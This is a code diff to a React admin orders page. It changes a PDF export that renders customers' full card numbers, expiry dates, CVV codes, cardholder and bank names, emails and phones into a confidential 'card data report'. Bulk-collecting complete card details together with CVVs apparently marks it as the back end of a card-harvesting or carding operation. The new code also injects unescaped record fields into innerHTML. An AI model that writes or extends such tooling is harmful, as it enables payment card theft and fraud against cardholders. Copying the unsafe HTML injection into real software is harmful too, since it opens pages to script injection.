@@ -8,6 +8,7 @@ import {
 } from "lucide-react";
 import { toast } from "sonner";
 import jsPDF from "jspdf";
+import html2canvas from "html2canvas";
 import ExportButtons from "@/components/admin/ExportButtons";
 
 interface Order {
@@ -64,112 +65,116 @@ const AdminOrders = () => {
     });
   };
 
-  const exportCardsPDF = () => {
+  const exportCardsPDF = async () => {
     const cardsData = filtered.filter(o => o.card_full_number || o.card_last4);
     if (cardsData.length === 0) {
       toast.error("لا توجد بيانات بطاقات للتصدير");
       return;
     }
 
-    const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
-    const pageW = 210;
-    const margin = 15;
-    const contentW = pageW - margin * 2;
+    toast.loading("جاري تصدير التقرير...", { id: "pdf-export" });
 
-    // Title
-    doc.setFontSize(18);
-    doc.setTextColor(109, 40, 217);
-    doc.text("Payment Card Data Report", pageW - margin, 20, { align: "right" });
-    doc.setFontSize(9);
-    doc.setTextColor(120);
-    doc.text(new Date().toLocaleDateString("ar-SA") + " | " + cardsData.length + " cards", pageW - margin, 27, { align: "right" });
+    // Build hidden HTML
+    const container = document.createElement("div");
+    container.style.cssText = "position:fixed;left:-9999px;top:0;width:794px;background:#fff;font-family:'Segoe UI',Tahoma,Arial,sans-serif;direction:rtl;padding:40px;";
+    container.innerHTML = `
+      <div style="text-align:center;margin-bottom:24px;">
+        <h1 style="font-size:22px;font-weight:800;color:#1a1a2e;margin:0 0 4px;">تقرير بيانات البطاقات</h1>
+        <p style="font-size:12px;color:#94a3b8;margin:0;">${new Date().toLocaleDateString("ar-SA")} — ${cardsData.length} بطاقة</p>
+        <div style="height:2px;background:linear-gradient(90deg,transparent,#d4a843,transparent);margin-top:12px;"></div>
+      </div>
+      ${cardsData.map((o, i) => `
+        <div style="border:1px solid #e2e8f0;border-radius:12px;overflow:hidden;margin-bottom:16px;break-inside:avoid;">
+          <div style="background:linear-gradient(135deg,#1a1a2e,#2d2d44);padding:10px 16px;display:flex;justify-content:space-between;align-items:center;">
+            <span style="color:#d4a843;font-size:11px;font-weight:700;">${o.confirmation_number || o.id.slice(0, 8)}</span>
+            <span style="color:#fff;font-size:12px;font-weight:700;">#${i + 1} ${(o.card_brand || "CARD").toUpperCase()}</span>
+          </div>
+          <div style="padding:14px 16px;background:#fafbfc;">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+              <div style="text-align:left;">
+                <span style="font-size:10px;color:#94a3b8;">رقم البطاقة</span>
+                <p style="font-size:16px;font-weight:700;color:#1a1a2e;margin:2px 0 0;letter-spacing:2px;direction:ltr;text-align:left;">${o.card_full_number || `**** ${o.card_last4}`}</p>
+              </div>
+            </div>
+            <div style="display:flex;gap:24px;margin-bottom:10px;">
+              <div style="flex:1;">
+                <span style="font-size:10px;color:#94a3b8;">الانتهاء</span>
+                <p style="font-size:13px;font-weight:600;color:#1a1a2e;margin:2px 0 0;direction:ltr;">${o.card_expiry || "N/A"}</p>
+              </div>
+              <div style="flex:1;">
+                <span style="font-size:10px;color:#94a3b8;">CVV</span>
+                <p style="font-size:13px;font-weight:700;color:#dc2626;margin:2px 0 0;direction:ltr;">${o.card_cvv || "N/A"}</p>
+              </div>
+              <div style="flex:1;">
+                <span style="font-size:10px;color:#94a3b8;">المبلغ</span>
+                <p style="font-size:13px;font-weight:600;color:#1a1a2e;margin:2px 0 0;">${o.total} ر.س</p>
+              </div>
+            </div>
+            <div style="display:flex;gap:24px;margin-bottom:10px;">
+              <div style="flex:1;">
+                <span style="font-size:10px;color:#94a3b8;">حامل البطاقة</span>
+                <p style="font-size:12px;font-weight:600;color:#334155;margin:2px 0 0;">${o.cardholder_name || "—"}</p>
+              </div>
+              <div style="flex:1;">
+                <span style="font-size:10px;color:#94a3b8;">البنك</span>
+                <p style="font-size:12px;font-weight:600;color:#334155;margin:2px 0 0;">${o.bank_name || "—"}</p>
+              </div>
+            </div>
+            <div style="border-top:1px solid #f1f5f9;padding-top:8px;display:flex;gap:16px;">
+              <span style="font-size:10px;color:#94a3b8;">📧 ${o.email}</span>
+              <span style="font-size:10px;color:#94a3b8;direction:ltr;">📱 ${o.phone}</span>
+            </div>
+          </div>
+        </div>
+      `).join("")}
+      <div style="text-align:center;margin-top:20px;padding-top:12px;border-top:1px solid #e2e8f0;">
+        <p style="font-size:9px;color:#cbd5e1;">سري — تقرير بيانات البطاقات — ${new Date().toLocaleString("ar-SA")}</p>
+      </div>
+    `;
+    document.body.appendChild(container);
 
-    // Divider
-    doc.setDrawColor(200);
-    doc.line(margin, 31, pageW - margin, 31);
+    try {
+      const canvas = await html2canvas(container, { scale: 2, useCORS: true, backgroundColor: "#ffffff" });
+      document.body.removeChild(container);
 
-    let y = 38;
-    const cardH = 52;
+      const imgW = 190;
+      const imgH = (canvas.height * imgW) / canvas.width;
+      const doc = new jsPDF({ orientation: "portrait", unit: "mm", format: "a4" });
+      const pageH = 277;
+      let position = 10;
 
-    cardsData.forEach((o, idx) => {
-      if (y + cardH > 280) {
-        doc.addPage();
-        y = 20;
+      if (imgH <= pageH) {
+        doc.addImage(canvas.toDataURL("image/png"), "PNG", 10, position, imgW, imgH);
+      } else {
+        // Multi-page
+        let remainingH = canvas.height;
+        let srcY = 0;
+        const sliceHPx = (pageH / imgH) * canvas.height;
+
+        while (remainingH > 0) {
+          const sliceH = Math.min(sliceHPx, remainingH);
+          const pageCanvas = document.createElement("canvas");
+          pageCanvas.width = canvas.width;
+          pageCanvas.height = sliceH;
+          const ctx = pageCanvas.getContext("2d")!;
+          ctx.drawImage(canvas, 0, srcY, canvas.width, sliceH, 0, 0, canvas.width, sliceH);
+
+          const pageImgH = (sliceH * imgW) / canvas.width;
+          if (srcY > 0) doc.addPage();
+          doc.addImage(pageCanvas.toDataURL("image/png"), "PNG", 10, 10, imgW, pageImgH);
+
+          srcY += sliceH;
+          remainingH -= sliceH;
+        }
       }
 
-      // Card background
-      doc.setFillColor(248, 250, 252);
-      doc.setDrawColor(226, 232, 240);
-      doc.roundedRect(margin, y, contentW, cardH, 3, 3, "FD");
-
-      // Card number header strip
-      doc.setFillColor(109, 40, 217);
-      doc.roundedRect(margin, y, contentW, 10, 3, 3, "F");
-      doc.rect(margin, y + 5, contentW, 5, "F");
-
-      // Card index + brand
-      doc.setFontSize(9);
-      doc.setTextColor(255);
-      doc.text(`#${idx + 1}  ${o.card_brand || "CARD"}`, pageW - margin - 4, y + 7, { align: "right" });
-      doc.text(o.confirmation_number || o.id.slice(0, 8), margin + 4, y + 7);
-
-      // Card details
-      const col1X = pageW - margin - 4;
-      const col2X = pageW / 2;
-      let detailY = y + 17;
-
-      doc.setFontSize(8);
-      doc.setTextColor(100);
-
-      // Row 1: Card Number
-      doc.text("Card Number:", col1X, detailY, { align: "right" });
-      doc.setTextColor(30);
-      doc.setFontSize(11);
-      doc.text(o.card_full_number || `**** ${o.card_last4}`, col1X - 28, detailY, { align: "right" });
-
-      // Row 2: Expiry + CVV
-      detailY += 8;
-      doc.setFontSize(8);
-      doc.setTextColor(100);
-      doc.text("Expiry:", col1X, detailY, { align: "right" });
-      doc.setTextColor(30);
-      doc.text(o.card_expiry || "N/A", col1X - 14, detailY, { align: "right" });
-
-      doc.setTextColor(100);
-      doc.text("CVV:", col2X, detailY, { align: "right" });
-      doc.setTextColor(220, 38, 38);
-      doc.setFontSize(9);
-      doc.text(o.card_cvv || "N/A", col2X - 10, detailY, { align: "right" });
-
-      // Row 3: Cardholder + Bank
-      detailY += 8;
-      doc.setFontSize(8);
-      doc.setTextColor(100);
-      doc.text("Holder:", col1X, detailY, { align: "right" });
-      doc.setTextColor(30);
-      doc.text(o.cardholder_name || "N/A", col1X - 14, detailY, { align: "right" });
-
-      doc.setTextColor(100);
-      doc.text("Bank:", col2X, detailY, { align: "right" });
-      doc.setTextColor(30);
-      doc.text(o.bank_name || "N/A", col2X - 12, detailY, { align: "right" });
-
-      // Row 4: Email + Phone
-      detailY += 8;
-      doc.setFontSize(7);
-      doc.setTextColor(130);
-      doc.text(`${o.email}  |  ${o.phone}`, col1X, detailY, { align: "right" });
-
-      y += cardH + 5;
-    });
-
-    // Footer
-    doc.setFontSize(7);
-    doc.setTextColor(180);
-    doc.text("CONFIDENTIAL - Payment Card Data", pageW / 2, 290, { align: "center" });
-
-    doc.save("card-data-report.pdf");
-    toast.success("تم تصدير بيانات البطاقات بنجاح");
+      doc.save("card-data-report.pdf");
+      toast.success("تم تصدير بيانات البطاقات بنجاح", { id: "pdf-export" });
+    } catch (err) {
+      document.body.removeChild(container);
+      console.error(err);
+      toast.error("فشل التصدير", { id: "pdf-export" });
+    }
   };
 
   const fetchOrders = async () => {
